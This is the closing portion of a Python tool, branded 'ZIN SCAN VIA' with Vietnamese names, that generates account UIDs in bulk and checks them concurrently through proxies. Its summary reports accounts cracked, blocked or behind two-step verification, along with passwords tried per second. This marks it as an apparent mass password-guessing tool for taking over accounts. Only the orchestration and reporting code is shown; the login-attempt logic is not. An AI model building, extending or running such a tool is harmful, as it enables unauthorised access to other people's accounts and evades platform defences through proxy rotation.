              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{CONFIG['timeout']}s{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} PROXY        "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}"
              f"{len(quan_ly_proxy.danh_sach) if CONFIG['enable_proxy'] else 'TẮT'}"
              f"{C.R}")
        vach_ngan()
        print(f"  {mau_cau_vong('⚡ ZIN SCAN VIA - LORD OF SECRET')}")
        vach_ngan()
        print()

        xoay_tron("Khởi động hệ thống", thoi_gian=0.6)
        cham_cho("Chuẩn bị hàng đợi", thoi_gian=0.4)
        print()

        hang_doi = asyncio.Queue(maxsize=CONFIG["queue_maxsize"])
        san_xuat_xong = asyncio.Event()
        dem_da_sinh = [0]

        async def san_xuat():
            try:
                con_lai = so_luong
                kich_thuoc_lo = CONFIG["uid_generate_chunk"]
                while con_lai > 0 and not _STOP_EVENT.is_set():
                    can = min(kich_thuoc_lo, con_lai)
                    lo = bo_sinh.sinh_lo(can)
                    for uid in lo:
                        if _STOP_EVENT.is_set():
                            break
                        await hang_doi.put(uid)
                        dem_da_sinh[0] += 1
                        con_lai -= 1
                        if con_lai <= 0:
                            break
            finally:
                san_xuat_xong.set()

        async def cong_nhan(bo_kiem_tra):
            while True:
                try:
                    uid = await asyncio.wait_for(
                        hang_doi.get(),
                        timeout=CONFIG["worker_poll_timeout"],
                    )
                except asyncio.TimeoutError:
                    if san_xuat_xong.is_set() and hang_doi.empty():
                        return
                    continue
                except asyncio.CancelledError:
                    return
                try:
                    if not _STOP_EVENT.is_set():
                        await bo_kiem_tra.kiem_tra_tai_khoan(uid)
                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    bo_kiem_tra.thong_ke.loi_uid += 1
                    sys.stderr.write(
                        f"[Công Nhân] uid={uid} "
                        f"{type(e).__name__}: {e}\n")
                finally:
                    hang_doi.task_done()

        async with BoKiemTra(quan_ly_proxy, thong_ke,
                              ghi_file, trang_thai,
                              mode=mode) as bo_kiem_tra:
            danh_sach_cong_nhan = [
                asyncio.create_task(cong_nhan(bo_kiem_tra))
                for _ in range(workers)
            ]
            tac_vu_san_xuat = asyncio.create_task(san_xuat())
            try:
                await tac_vu_san_xuat
                await asyncio.gather(*danh_sach_cong_nhan,
                                      return_exceptions=True)
            except asyncio.CancelledError:
                for cn in danh_sach_cong_nhan:
                    cn.cancel()
                await asyncio.gather(*danh_sach_cong_nhan,
                                      return_exceptions=True)
            except Exception as e:
                sys.stderr.write(f"[Chính] Lỗi sản xuất: {e}\n")
            finally:
                for cn in danh_sach_cong_nhan:
                    if not cn.done():
                        cn.cancel()
                if not tac_vu_san_xuat.done():
                    tac_vu_san_xuat.cancel()
                await asyncio.gather(*danh_sach_cong_nhan,
                                      tac_vu_san_xuat,
                                      return_exceptions=True)

        try:
            await ghi_file.ket_thuc()
        except Exception:
            pass
        try:
            await trang_thai.luu()
        except Exception:
            pass

        tieu_de_dong.dung()
        try:
            with _STDOUT_KHOA:
                sys.stdout.write("\r\033[2K\033]0;ZIN TOOL SCAN\007")
                sys.stdout.flush()
        except OSError:
            pass

        for cb in bo_sinh.canh_bao_gan_can():
            sys.stderr.write(f"[UID] Cảnh báo gần cạn: {cb}\n")

        self._in_tong_ket(thong_ke, ghi_file, dem_da_sinh[0],
                           cfg, mode, workers)
        try:
            input(f"  {C.CYAN}➤ Nhấn Enter để thoát...{C.R}")
        except (EOFError, KeyboardInterrupt):
            print()

    def _in_tong_ket(self, thong_ke, ghi_file, da_sinh,
                       cfg, mode, workers):
        print()
        print("  " + vien_cau_vong("═"))
        print()
        hop_can_giua("✦ HOÀN TẤT ✦")
        print()
        print("  " + vien_cau_vong("═", palette=RAINBOW2))
        print()
        print(f"  {cfg['color']}{C.B}Chế Độ          {C.R}{C.GRAY}▸{C.R} "
              f"{cfg['color']}{C.B}{cfg['icon']} {cfg['name']}{C.R}")
        print(f"  {cfg['color']}{C.B}Workers         {C.R}{C.GRAY}▸{C.R} "
              f"{cfg['color']}{C.B}{workers}{C.R}")
        print(f"  {C.GREEN}{C.B}Thành Công      {C.R}{C.GRAY}▸{C.R} "
              f"{C.GREEN}{C.B}{thong_ke.thanh_cong}{C.R}")
        print(f"  {C.GOLD}{C.B}Bị Chặn         {C.R}{C.GRAY}▸{C.R} "
              f"{C.GOLD}{C.B}{thong_ke.chan}{C.R}")
        print(f"  {C.PINK}{C.B}Xác Minh 2 Bước {C.R}{C.GRAY}▸{C.R} "
              f"{C.PINK}{C.B}{thong_ke.hai_buoc}{C.R}")
        print(f"  {C.CRIMSON}{C.B}Lỗi Request     {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}{thong_ke.loi_request}{C.R}")
        print(f"  {C.CRIMSON}{C.B}Lỗi Ghi File    {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}{thong_ke.loi_ghi_file}{C.R}")
        print(f"  {C.CRIMSON}{C.B}Lỗi UID (bug)   {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}{thong_ke.loi_uid}{C.R}")
        print(f"  {C.CYAN}{C.B}UID Đã Xử Lý    {C.R}{C.GRAY}▸{C.R} "
              f"{C.CYAN}{C.B}{thong_ke.uid_da_xu_ly}{C.R}")
        print(f"  {C.CYAN}{C.B}Password Đã Thử {C.R}{C.GRAY}▸{C.R} "
              f"{C.CYAN}{C.B}{thong_ke.da_thu}{C.R}")
        print(f"  {C.VIOLET}{C.B}Đã Thử Lại      {C.R}{C.GRAY}▸{C.R} "
              f"{C.VIOLET}{C.B}{thong_ke.thu_lai}{C.R}")
        print(f"  {C.VIOLET}{C.B}Thời Gian       {C.R}{C.GRAY}▸{C.R} "
              f"{C.VIOLET}{C.B}{thong_ke.thoi_gian_chay():.1f} giây{C.R}")
        print(f"  {C.SKY}{C.B}Tốc Độ Pass     {C.R}{C.GRAY}▸{C.R} "
              f"{C.SKY}{C.B}{thong_ke.toc_do():.1f}/giây{C.R}")
        print(f"  {C.SKY}{C.B}Tốc Độ UID      {C.R}{C.GRAY}▸{C.R} "
              f"{C.SKY}{C.B}{thong_ke.toc_do_uid():.1f}/giây{C.R}")
        print(f"  {C.WHITE}{C.B}Tổng Đã Sinh    {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{da_sinh}{C.R}")
        print()
        print(f"  {C.GOLD}💾 Thư mục: {C.WHITE}{CONFIG['output_dir']}{C.R}")
        for loai in ("thanhcong", "chan", "haibuoc"):
            duong_dan = ghi_file.tep.get(loai, {}).get("txt")
            if duong_dan and duong_dan.exists():
                print(f"     {C.GRAY}• {loai}: {duong_dan.name}{C.R}")
        print()
        print("  " + vien_cau_vong("✦"))
        print()


def main():
    try:
        UngDungZin().chay()
    except KeyboardInterrupt:
        print(f"\n\n  {C.RED}⏹ Đã dừng bởi người dùng{C.R}\n")
        sys.exit(0)
    except Exception as e:
        sys.stderr.write(f"\n  {C.RED}✗ Lỗi: "
                         f"{type(e).__name__}: {e}{C.R}\n")
        sys.exit(1)


if __name__ == "__main__":
    main()